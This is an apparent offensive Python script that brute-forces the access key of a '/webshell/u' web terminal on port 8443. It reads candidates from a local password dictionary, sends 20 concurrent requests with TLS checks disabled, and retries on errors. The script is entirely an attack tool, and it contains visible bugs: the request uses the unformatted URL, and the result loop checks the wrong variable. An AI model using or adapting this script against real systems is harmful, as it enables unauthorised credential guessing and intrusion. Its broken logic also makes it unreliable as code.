import time
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3

urllib3.disable_warnings()

def brute_url_get(url:str,parameter:str,error_key:str):
    """
    爆破URL
    :param url:
    :param parameter:
    :param error_key:
    :return:
    """
    print(url.format(parameter.strip().strip('\n')))
    try:
        resp=requests.get(url,verify=False)
        print(resp.text)
    except Exception as e:
        time.sleep(20)
        return brute_url_get(url, parameter, error_key)
    if error_key in resp.text:
        return False
    else:
        return True

def read_dict(path):
    """
    读取字典
    :param path:
    :return:
    """
    res=[]
    with open(path,'r',encoding='utf-8') as f:
        line=f.readline()
        while line:
            res.append(line)
            line = f.readline()
    return res

if __name__ == '__main__':
    pool = ThreadPoolExecutor(20)
    ks=read_dict(r"E:\documents\docs\MidPwds.txt")
    reslist=[]
    for k in ks:
        # Submit work to the pool
        res = pool.submit(brute_url_get, "https://:8443/webshell/u?s=428272880&w=80&h=24&k={0}%0D",k,'<span class="ff be"')
        reslist.append(res)
    for r in reslist:
        isok=res.result()
        if isok:
                print(f"find the k:{k}")
                exit(0)
                break

